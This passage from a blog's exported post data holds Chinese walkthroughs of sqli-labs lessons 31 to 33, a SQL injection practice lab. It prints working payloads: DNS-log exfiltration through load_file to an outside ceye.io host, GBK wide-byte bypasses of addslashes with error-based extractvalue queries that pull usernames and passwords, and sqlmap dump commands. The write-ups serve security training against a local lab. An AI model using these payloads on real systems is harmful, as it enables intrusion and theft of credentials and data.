id=\"获取数据库名\"><a href=\"#获取数据库名\" class=\"headerlink\" title=\"获取数据库名\"></a>获取数据库名</h3><p>这里我原来的环境的ip地址访问不到dns。虚拟机环境切换成桥接。</p>\n<p><code>http://10.60.250.250/sql/Less-31/login.php?id=1&amp;id=2&quot;) union select 1,(select load_file(concat(&#39;\\\\\\\\&#39;,(select database()),&#39;.域名.ceye.io\\\\abc&#39;))),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-31/005.png\" alt=\"005\"></p>\n<h3 id=\"获取表名\"><a href=\"#获取表名\" class=\"headerlink\" title=\"获取表名\"></a>获取表名</h3><p>只能一个一个获取</p>\n<p><code>http://10.60.250.250/sql/Less-31/login.php?id=1&amp;id=2&quot;) union select 1,(select load_file(concat(&#39;\\\\\\\\&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1) ,&#39;.kg74jx.ceye.io\\\\abc&#39;))),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-31/006.png\" alt=\"006\"></p>\n<h3 id=\"获取列名\"><a href=\"#获取列名\" class=\"headerlink\" title=\"获取列名\"></a>获取列名</h3><p><code>http://10.60.250.250/sql/Less-31/login.php?id=1&amp;id=2&quot;) union select 1,(select load_file(concat(&#39;\\\\\\\\&#39;,(select (column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39; limit 2,1) ,&#39;.kg74jx.ceye.io\\\\abc&#39;))),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-31/007.png\" alt=\"007\"></p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p><code>http://10.60.250.250/sql/Less-31/login.php?id=1&amp;id=2&quot;) union select 1,(select load_file(concat(&#39;\\\\\\\\&#39;,(select concat(username,&#39;_&#39;,password) from users limit 1,1) ,&#39;.kg74jx.ceye.io\\\\abc&#39;))),3%23</code></p>\n<p><img src=\"/img/sql/Lesson-31/008.png\" alt=\"008\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><figure class=\"highlight diff\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"deletion\">--technique T:注入方式为时间注入</span></span><br><span class=\"line\"><span class=\"deletion\">--dbms 10：后端数据库设置为mysql</span></span><br><span class=\"line\"><span class=\"deletion\">--threads 10:并发线程设置为10</span></span><br><span class=\"line\"><span class=\"deletion\">--flush-session:刷新session</span></span><br><span class=\"line\"><span class=\"deletion\">--fresh-queries:发起新查询</span></span><br><span class=\"line\"><span class=\"deletion\">-v 3：显示测试过程</span></span><br></pre></td></tr></table></figure>\n\n<p><code>sqlmap -u http://10.60.250.250/sql/Less-31/login.php?id=1&amp;id=2 --dbms mysql --technique T --level 2 --threads 10 -v 3 --flush-session --fresh-queries</code></p>\n<p><img src=\"/img/sql/Lesson-31/009.png\" alt=\"009\"></p>\n<p><code>sqlmap -u &quot;http://10.60.250.250/sql/Less-31/login.php?id=1&amp;id=2&quot; --dbms mysql --technique T --level 2 --threads 10 -v 3 --dbs</code></p>\n<p><img src=\"/img/sql/Lesson-31/010.png\" alt=\"010\"></p>\n<p><code>sqlmap -u &quot;http://10.60.250.250/sql/Less-31/login.php?id=1&amp;id=2&quot; --dbms mysql --technique T --level 2 --threads 10 -D security --tables</code></p>\n<p><img src=\"/img/sql/Lesson-31/011.png\" alt=\"011\"></p>\n<p><code>sqlmap -u &quot;http://10.60.250.250/sql/Less-31/login.php?id=1&amp;id=2&quot; --dbms mysql --technique T --level 2 --threads 10 -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-31/012.png\" alt=\"012\"></p>\n"},{"title":"sqli-labs lession-32 GET-绕过自定义过滤器-向危险字符添加斜杠","date":"2018-10-14T13:10:54.000Z","_content":"\n# sqli-labs lession-32 GET-绕过自定义过滤器-向危险字符添加斜杠\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-32/001.png)\n\n## 分析\n\n![002](/img/sql/Lesson-32/002.png)\n\nord — 返回字符的 ASCII 码值\n\ndechex — 十进制转换为十六进制\n\n将id的值转成16进制,最终在页面显示出来。\n\n![003](/img/sql/Lesson-32/003.png)\n\n![004](/img/sql/Lesson-32/004.png)\n\n现在看看check_addslashes这个自定义函数做什么过滤。\n\n![005](/img/sql/Lesson-32/005.png)\n\n```\nfunction check_addslashes($string)\n{\n    $string = preg_replace('/'. preg_quote('\\\\') .'/', \"\\\\\\\\\\\\\", $string);          \t\t//将\\用\\\\替代,即转义\\\n\techo $string.'<br>';\n    $string = preg_replace('/\\'/i', '\\\\\\'', $string);            \n    //将'用\\'替代,即转义'\n\techo $string.'<br>';\n\n    $string = preg_replace('/\\\"/', \"\\\\\\\"\", $string);                                \t\t//将\"用\\\"替代,即转义\"\n     \n\techo $string.'<br>';\n\n    return $string;\n```\n\n这里考的是宽字节绕过。\n\n注意上图中有：\n\nmysql_query(\"SET NAMES gbk\");\n\n## 宽字节注入\n\n红日安全团队团队对宽字节注入研究的很细致。\n\nhttp://www.freebuf.com/column/165567.html\n\n提取下主干\n\n基本概念：\n\n1. 宽字节是相对于ascII这样单字节而言的；像GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节\n2. GBK是一种多字符的编码，通常来说，一个gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节\n3. 转义函数：为了过滤用户输入的一些数据，对特殊的字符加上反斜杠“\\”进行转义；Mysql中转义的函数addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种是配置magic_quote_gpc，不过PHP高版本已经移除此功能\n\n宽字节注入指的是mysql数据库在使用宽字节（GBK）编码时，会认为两个字符是一个汉字（前一个ascii码要大于128（比如%df），才到汉字的范围），而且当我们输入单引号时，mysql会调用转义函数，将单引号变为\\’，其中\\的十六进制是%5c,mysql的GBK编码，会认为%df%5c是一个宽字节，也就是’運’，从而使单引号闭合（逃逸），进行注入攻击。\n\n## 注入\n\n利用报错注入\n\n### 获取数据库名\n\n`http://192.168.75.132/sql/Less-32/?id=1%df'and extractvalue(null,concat(0x7e,database(),0x7e))%23`\n\n![006](/img/sql/Lesson-32/006.png)\n\n### 获取表名\n\n`http://192.168.75.132/sql/Less-32/?id=1%df'and extractvalue(null,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479),0x7e))%23`\n\n这里`0x7365637572697479`是`security`的16进制编码,为的是绕过原来的`'securty'`。\n\n![007](/img/sql/Lesson-32/007.png)\n\n### 获取列名\n\n`http://192.168.75.132/sql/Less-32/?id=1%df'and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273 and table_schema=0x7365637572697479),0x7e))%23`\n\n![008](/img/sql/Lesson-32/008.png)\n\n### 获取字段\n\n`http://192.168.75.132/sql/Less-32/?id=1%df'and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e))%23`\n\n![009](/img/sql/Lesson-32/009.png)\n\n## SQLMAP\n\ntamper自带了宽字节绕过的脚本unmagicquotes.py\n\n`sqlmap -u \"http://192.168.75.132/sql/Less-32/?id=1\" --dbms mysql --technique E --tamper unmagicquotes.py`\n\n![010](/img/sql/Lesson-32/010.png)\n\n![011](/img/sql/Lesson-32/011.png)\n\n`sqlmap -u \"http://192.168.75.132/sql/Less-32/?id=1\" --dbms mysql --technique E --tamper unmagicquotes.py --dbs`\n\n![012](/img/sql/Lesson-32/012.png)\n\n![013](/img/sql/Lesson-32/013.png)\n\n`sqlmap -u \"http://192.168.75.132/sql/Less-32/?id=1\" --dbms mysql --technique E --tamper unmagicquotes.py -D security --tables`\n\n![014](/img/sql/Lesson-32/014.png)\n\n![015](/img/sql/Lesson-32/015.png)\n\n`sqlmap -u \"http://192.168.75.132/sql/Less-32/?id=1\" --dbms mysql --technique E --tamper unmagicquotes.py -D security -T users --columns --dump`\n\n![016](/img/sql/Lesson-32/016.png)\n\n![017](/img/sql/Lesson-32/017.png)\n\n\n\n\n\n","source":"_posts/sqli-labs-lession-32-GET-绕过自定义过滤器-向危险字符添加斜杠.md","raw":"---\ntitle: sqli-labs lession-32 GET-绕过自定义过滤器-向危险字符添加斜杠\ndate: 2018-10-14 21:10:54\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-32 GET-绕过自定义过滤器-向危险字符添加斜杠\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-32/001.png)\n\n## 分析\n\n![002](/img/sql/Lesson-32/002.png)\n\nord — 返回字符的 ASCII 码值\n\ndechex — 十进制转换为十六进制\n\n将id的值转成16进制,最终在页面显示出来。\n\n![003](/img/sql/Lesson-32/003.png)\n\n![004](/img/sql/Lesson-32/004.png)\n\n现在看看check_addslashes这个自定义函数做什么过滤。\n\n![005](/img/sql/Lesson-32/005.png)\n\n```\nfunction check_addslashes($string)\n{\n    $string = preg_replace('/'. preg_quote('\\\\') .'/', \"\\\\\\\\\\\\\", $string);          \t\t//将\\用\\\\替代,即转义\\\n\techo $string.'<br>';\n    $string = preg_replace('/\\'/i', '\\\\\\'', $string);            \n    //将'用\\'替代,即转义'\n\techo $string.'<br>';\n\n    $string = preg_replace('/\\\"/', \"\\\\\\\"\", $string);                                \t\t//将\"用\\\"替代,即转义\"\n     \n\techo $string.'<br>';\n\n    return $string;\n```\n\n这里考的是宽字节绕过。\n\n注意上图中有：\n\nmysql_query(\"SET NAMES gbk\");\n\n## 宽字节注入\n\n红日安全团队团队对宽字节注入研究的很细致。\n\nhttp://www.freebuf.com/column/165567.html\n\n提取下主干\n\n基本概念：\n\n1. 宽字节是相对于ascII这样单字节而言的；像GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节\n2. GBK是一种多字符的编码，通常来说，一个gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节\n3. 转义函数：为了过滤用户输入的一些数据，对特殊的字符加上反斜杠“\\”进行转义；Mysql中转义的函数addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种是配置magic_quote_gpc，不过PHP高版本已经移除此功能\n\n宽字节注入指的是mysql数据库在使用宽字节（GBK）编码时，会认为两个字符是一个汉字（前一个ascii码要大于128（比如%df），才到汉字的范围），而且当我们输入单引号时，mysql会调用转义函数，将单引号变为\\’，其中\\的十六进制是%5c,mysql的GBK编码，会认为%df%5c是一个宽字节，也就是’運’，从而使单引号闭合（逃逸），进行注入攻击。\n\n## 注入\n\n利用报错注入\n\n### 获取数据库名\n\n`http://192.168.75.132/sql/Less-32/?id=1%df'and extractvalue(null,concat(0x7e,database(),0x7e))%23`\n\n![006](/img/sql/Lesson-32/006.png)\n\n### 获取表名\n\n`http://192.168.75.132/sql/Less-32/?id=1%df'and extractvalue(null,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479),0x7e))%23`\n\n这里`0x7365637572697479`是`security`的16进制编码,为的是绕过原来的`'securty'`。\n\n![007](/img/sql/Lesson-32/007.png)\n\n### 获取列名\n\n`http://192.168.75.132/sql/Less-32/?id=1%df'and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273 and table_schema=0x7365637572697479),0x7e))%23`\n\n![008](/img/sql/Lesson-32/008.png)\n\n### 获取字段\n\n`http://192.168.75.132/sql/Less-32/?id=1%df'and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e))%23`\n\n![009](/img/sql/Lesson-32/009.png)\n\n## SQLMAP\n\ntamper自带了宽字节绕过的脚本unmagicquotes.py\n\n`sqlmap -u \"http://192.168.75.132/sql/Less-32/?id=1\" --dbms mysql --technique E --tamper unmagicquotes.py`\n\n![010](/img/sql/Lesson-32/010.png)\n\n![011](/img/sql/Lesson-32/011.png)\n\n`sqlmap -u \"http://192.168.75.132/sql/Less-32/?id=1\" --dbms mysql --technique E --tamper unmagicquotes.py --dbs`\n\n![012](/img/sql/Lesson-32/012.png)\n\n![013](/img/sql/Lesson-32/013.png)\n\n`sqlmap -u \"http://192.168.75.132/sql/Less-32/?id=1\" --dbms mysql --technique E --tamper unmagicquotes.py -D security --tables`\n\n![014](/img/sql/Lesson-32/014.png)\n\n![015](/img/sql/Lesson-32/015.png)\n\n`sqlmap -u \"http://192.168.75.132/sql/Less-32/?id=1\" --dbms mysql --technique E --tamper unmagicquotes.py -D security -T users --columns --dump`\n\n![016](/img/sql/Lesson-32/016.png)\n\n![017](/img/sql/Lesson-32/017.png)\n\n\n\n\n\n","slug":"sqli-labs-lession-32-GET-绕过自定义过滤器-向危险字符添加斜杠","published":1,"updated":"2019-06-19T17:23:13.391Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3iste300454dsb80lkwuag","content":"<h1 id=\"sqli-labs-lession-32-GET-绕过自定义过滤器-向危险字符添加斜杠\"><a href=\"#sqli-labs-lession-32-GET-绕过自定义过滤器-向危险字符添加斜杠\" class=\"headerlink\" title=\"sqli-labs lession-32 GET-绕过自定义过滤器-向危险字符添加斜杠\"></a>sqli-labs lession-32 GET-绕过自定义过滤器-向危险字符添加斜杠</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-32/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p><img src=\"/img/sql/Lesson-32/002.png\" alt=\"002\"></p>\n<p>ord — 返回字符的 ASCII 码值</p>\n<p>dechex — 十进制转换为十六进制</p>\n<p>将id的值转成16进制,最终在页面显示出来。</p>\n<p><img src=\"/img/sql/Lesson-32/003.png\" alt=\"003\"></p>\n<p><img src=\"/img/sql/Lesson-32/004.png\" alt=\"004\"></p>\n<p>现在看看check_addslashes这个自定义函数做什么过滤。</p>\n<p><img src=\"/img/sql/Lesson-32/005.png\" alt=\"005\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check_addslashes</span><span class=\"params\">($string)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $string = preg_replace(<span class=\"string\">'/'</span>. preg_quote(<span class=\"string\">'\\\\'</span>) .<span class=\"string\">'/'</span>, <span class=\"string\">\"\\\\\\\\\\\\\"</span>, $string);          \t\t<span class=\"comment\">//将\\用\\\\替代,即转义\\</span></span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> $string.<span class=\"string\">'&lt;br&gt;'</span>;</span><br><span class=\"line\">    $string = preg_replace(<span class=\"string\">'/\\'/i'</span>, <span class=\"string\">'\\\\\\''</span>, $string);            </span><br><span class=\"line\">    <span class=\"comment\">//将'用\\'替代,即转义'</span></span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> $string.<span class=\"string\">'&lt;br&gt;'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    $string = preg_replace(<span class=\"string\">'/\\\"/'</span>, <span class=\"string\">\"\\\\\\\"\"</span>, $string);                                \t\t<span class=\"comment\">//将\"用\\\"替代,即转义\"</span></span><br><span class=\"line\">     </span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> $string.<span class=\"string\">'&lt;br&gt;'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> $string;</span><br></pre></td></tr></table></figure>\n\n<p>这里考的是宽字节绕过。</p>\n<p>注意上图中有：</p>\n<p>mysql_query(“SET NAMES gbk”);</p>\n<h2 id=\"宽字节注入\"><a href=\"#宽字节注入\" class=\"headerlink\" title=\"宽字节注入\"></a>宽字节注入</h2><p>红日安全团队团队对宽字节注入研究的很细致。</p>\n<p><a href=\"http://www.freebuf.com/column/165567.html\" target=\"_blank\" rel=\"noopener\">http://www.freebuf.com/column/165567.html</a></p>\n<p>提取下主干</p>\n<p>基本概念：</p>\n<ol>\n<li>宽字节是相对于ascII这样单字节而言的；像GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节</li>\n<li>GBK是一种多字符的编码，通常来说，一个gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节</li>\n<li>转义函数：为了过滤用户输入的一些数据，对特殊的字符加上反斜杠“\\”进行转义；Mysql中转义的函数addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种是配置magic_quote_gpc，不过PHP高版本已经移除此功能</li>\n</ol>\n<p>宽字节注入指的是mysql数据库在使用宽字节（GBK）编码时，会认为两个字符是一个汉字（前一个ascii码要大于128（比如%df），才到汉字的范围），而且当我们输入单引号时，mysql会调用转义函数，将单引号变为\\’，其中\\的十六进制是%5c,mysql的GBK编码，会认为%df%5c是一个宽字节，也就是’運’，从而使单引号闭合（逃逸），进行注入攻击。</p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>利用报错注入</p>\n<h3 id=\"获取数据库名\"><a href=\"#获取数据库名\" class=\"headerlink\" title=\"获取数据库名\"></a>获取数据库名</h3><p><code>http://192.168.75.132/sql/Less-32/?id=1%df&#39;and extractvalue(null,concat(0x7e,database(),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-32/006.png\" alt=\"006\"></p>\n<h3 id=\"获取表名\"><a href=\"#获取表名\" class=\"headerlink\" title=\"获取表名\"></a>获取表名</h3><p><code>http://192.168.75.132/sql/Less-32/?id=1%df&#39;and extractvalue(null,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479),0x7e))%23</code></p>\n<p>这里<code>0x7365637572697479</code>是<code>security</code>的16进制编码,为的是绕过原来的<code>&#39;securty&#39;</code>。</p>\n<p><img src=\"/img/sql/Lesson-32/007.png\" alt=\"007\"></p>\n<h3 id=\"获取列名\"><a href=\"#获取列名\" class=\"headerlink\" title=\"获取列名\"></a>获取列名</h3><p><code>http://192.168.75.132/sql/Less-32/?id=1%df&#39;and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273 and table_schema=0x7365637572697479),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-32/008.png\" alt=\"008\"></p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p><code>http://192.168.75.132/sql/Less-32/?id=1%df&#39;and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-32/009.png\" alt=\"009\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>tamper自带了宽字节绕过的脚本unmagicquotes.py</p>\n<p><code>sqlmap -u &quot;http://192.168.75.132/sql/Less-32/?id=1&quot; --dbms mysql --technique E --tamper unmagicquotes.py</code></p>\n<p><img src=\"/img/sql/Lesson-32/010.png\" alt=\"010\"></p>\n<p><img src=\"/img/sql/Lesson-32/011.png\" alt=\"011\"></p>\n<p><code>sqlmap -u &quot;http://192.168.75.132/sql/Less-32/?id=1&quot; --dbms mysql --technique E --tamper unmagicquotes.py --dbs</code></p>\n<p><img src=\"/img/sql/Lesson-32/012.png\" alt=\"012\"></p>\n<p><img src=\"/img/sql/Lesson-32/013.png\" alt=\"013\"></p>\n<p><code>sqlmap -u &quot;http://192.168.75.132/sql/Less-32/?id=1&quot; --dbms mysql --technique E --tamper unmagicquotes.py -D security --tables</code></p>\n<p><img src=\"/img/sql/Lesson-32/014.png\" alt=\"014\"></p>\n<p><img src=\"/img/sql/Lesson-32/015.png\" alt=\"015\"></p>\n<p><code>sqlmap -u &quot;http://192.168.75.132/sql/Less-32/?id=1&quot; --dbms mysql --technique E --tamper unmagicquotes.py -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-32/016.png\" alt=\"016\"></p>\n<p><img src=\"/img/sql/Lesson-32/017.png\" alt=\"017\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-32-GET-绕过自定义过滤器-向危险字符添加斜杠\"><a href=\"#sqli-labs-lession-32-GET-绕过自定义过滤器-向危险字符添加斜杠\" class=\"headerlink\" title=\"sqli-labs lession-32 GET-绕过自定义过滤器-向危险字符添加斜杠\"></a>sqli-labs lession-32 GET-绕过自定义过滤器-向危险字符添加斜杠</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-32/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p><img src=\"/img/sql/Lesson-32/002.png\" alt=\"002\"></p>\n<p>ord — 返回字符的 ASCII 码值</p>\n<p>dechex — 十进制转换为十六进制</p>\n<p>将id的值转成16进制,最终在页面显示出来。</p>\n<p><img src=\"/img/sql/Lesson-32/003.png\" alt=\"003\"></p>\n<p><img src=\"/img/sql/Lesson-32/004.png\" alt=\"004\"></p>\n<p>现在看看check_addslashes这个自定义函数做什么过滤。</p>\n<p><img src=\"/img/sql/Lesson-32/005.png\" alt=\"005\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check_addslashes</span><span class=\"params\">($string)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $string = preg_replace(<span class=\"string\">'/'</span>. preg_quote(<span class=\"string\">'\\\\'</span>) .<span class=\"string\">'/'</span>, <span class=\"string\">\"\\\\\\\\\\\\\"</span>, $string);          \t\t<span class=\"comment\">//将\\用\\\\替代,即转义\\</span></span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> $string.<span class=\"string\">'&lt;br&gt;'</span>;</span><br><span class=\"line\">    $string = preg_replace(<span class=\"string\">'/\\'/i'</span>, <span class=\"string\">'\\\\\\''</span>, $string);            </span><br><span class=\"line\">    <span class=\"comment\">//将'用\\'替代,即转义'</span></span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> $string.<span class=\"string\">'&lt;br&gt;'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    $string = preg_replace(<span class=\"string\">'/\\\"/'</span>, <span class=\"string\">\"\\\\\\\"\"</span>, $string);                                \t\t<span class=\"comment\">//将\"用\\\"替代,即转义\"</span></span><br><span class=\"line\">     </span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> $string.<span class=\"string\">'&lt;br&gt;'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> $string;</span><br></pre></td></tr></table></figure>\n\n<p>这里考的是宽字节绕过。</p>\n<p>注意上图中有：</p>\n<p>mysql_query(“SET NAMES gbk”);</p>\n<h2 id=\"宽字节注入\"><a href=\"#宽字节注入\" class=\"headerlink\" title=\"宽字节注入\"></a>宽字节注入</h2><p>红日安全团队团队对宽字节注入研究的很细致。</p>\n<p><a href=\"http://www.freebuf.com/column/165567.html\" target=\"_blank\" rel=\"noopener\">http://www.freebuf.com/column/165567.html</a></p>\n<p>提取下主干</p>\n<p>基本概念：</p>\n<ol>\n<li>宽字节是相对于ascII这样单字节而言的；像GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节</li>\n<li>GBK是一种多字符的编码，通常来说，一个gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节</li>\n<li>转义函数：为了过滤用户输入的一些数据，对特殊的字符加上反斜杠“\\”进行转义；Mysql中转义的函数addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种是配置magic_quote_gpc，不过PHP高版本已经移除此功能</li>\n</ol>\n<p>宽字节注入指的是mysql数据库在使用宽字节（GBK）编码时，会认为两个字符是一个汉字（前一个ascii码要大于128（比如%df），才到汉字的范围），而且当我们输入单引号时，mysql会调用转义函数，将单引号变为\\’，其中\\的十六进制是%5c,mysql的GBK编码，会认为%df%5c是一个宽字节，也就是’運’，从而使单引号闭合（逃逸），进行注入攻击。</p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>利用报错注入</p>\n<h3 id=\"获取数据库名\"><a href=\"#获取数据库名\" class=\"headerlink\" title=\"获取数据库名\"></a>获取数据库名</h3><p><code>http://192.168.75.132/sql/Less-32/?id=1%df&#39;and extractvalue(null,concat(0x7e,database(),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-32/006.png\" alt=\"006\"></p>\n<h3 id=\"获取表名\"><a href=\"#获取表名\" class=\"headerlink\" title=\"获取表名\"></a>获取表名</h3><p><code>http://192.168.75.132/sql/Less-32/?id=1%df&#39;and extractvalue(null,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479),0x7e))%23</code></p>\n<p>这里<code>0x7365637572697479</code>是<code>security</code>的16进制编码,为的是绕过原来的<code>&#39;securty&#39;</code>。</p>\n<p><img src=\"/img/sql/Lesson-32/007.png\" alt=\"007\"></p>\n<h3 id=\"获取列名\"><a href=\"#获取列名\" class=\"headerlink\" title=\"获取列名\"></a>获取列名</h3><p><code>http://192.168.75.132/sql/Less-32/?id=1%df&#39;and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273 and table_schema=0x7365637572697479),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-32/008.png\" alt=\"008\"></p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p><code>http://192.168.75.132/sql/Less-32/?id=1%df&#39;and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e))%23</code></p>\n<p><img src=\"/img/sql/Lesson-32/009.png\" alt=\"009\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>tamper自带了宽字节绕过的脚本unmagicquotes.py</p>\n<p><code>sqlmap -u &quot;http://192.168.75.132/sql/Less-32/?id=1&quot; --dbms mysql --technique E --tamper unmagicquotes.py</code></p>\n<p><img src=\"/img/sql/Lesson-32/010.png\" alt=\"010\"></p>\n<p><img src=\"/img/sql/Lesson-32/011.png\" alt=\"011\"></p>\n<p><code>sqlmap -u &quot;http://192.168.75.132/sql/Less-32/?id=1&quot; --dbms mysql --technique E --tamper unmagicquotes.py --dbs</code></p>\n<p><img src=\"/img/sql/Lesson-32/012.png\" alt=\"012\"></p>\n<p><img src=\"/img/sql/Lesson-32/013.png\" alt=\"013\"></p>\n<p><code>sqlmap -u &quot;http://192.168.75.132/sql/Less-32/?id=1&quot; --dbms mysql --technique E --tamper unmagicquotes.py -D security --tables</code></p>\n<p><img src=\"/img/sql/Lesson-32/014.png\" alt=\"014\"></p>\n<p><img src=\"/img/sql/Lesson-32/015.png\" alt=\"015\"></p>\n<p><code>sqlmap -u &quot;http://192.168.75.132/sql/Less-32/?id=1&quot; --dbms mysql --technique E --tamper unmagicquotes.py -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-32/016.png\" alt=\"016\"></p>\n<p><img src=\"/img/sql/Lesson-32/017.png\" alt=\"017\"></p>\n"},{"title":"sqli-labs lession-33 GET-绕过AddSlashes","date":"2018-10-15T06:40:01.000Z","_content":"\n# sqli-labs lession-33 GET-绕过AddSlashes\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-33/001.png)\n\n## 分析\n\n![002](/img/sql/Lesson-33/002.png)\n\n由于使用了addslashes函数将单引号（`’`）转义，但是使用了gbk编码,同样使用宽字节绕过。\n\n![003](/img/sql/Lesson-33/003.png)\n\n## 注入\n\n跟上一课payload一模一样,过程图就不放上来了。\n\n{% post_link sqli-labs-lession-32-GET-绕过自定义过滤器-向危险字符添加斜杠 点击查看Lesson-32%}\n\n`http://192.168.75.132/sql/Less-33/?id=1%df'and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e))%23`\n\n![004](/img/sql/Lesson-33/004.png)\n\n## SQLMAP\n\ntamper自带了宽字节绕过的脚本unmagicquotes.py\n\n`sqlmap -u \"http://192.168.75.132/sql/Less-33/?id=1'\" --dbms mysql --technique E --tamper unmagicquotes.py --threads 10 -v 3`\n\n![006](/img/sql/Lesson-33/006.png)\n\n![005](/img/sql/Lesson-33/005.png)\n\n直接上结果\n\n`sqlmap -u \"http://192.168.75.132/sql/Less-33/?id=1'\" --dbms mysql --technique E --tamper unmagicquotes.py --threads 10 -D security -T users --columns 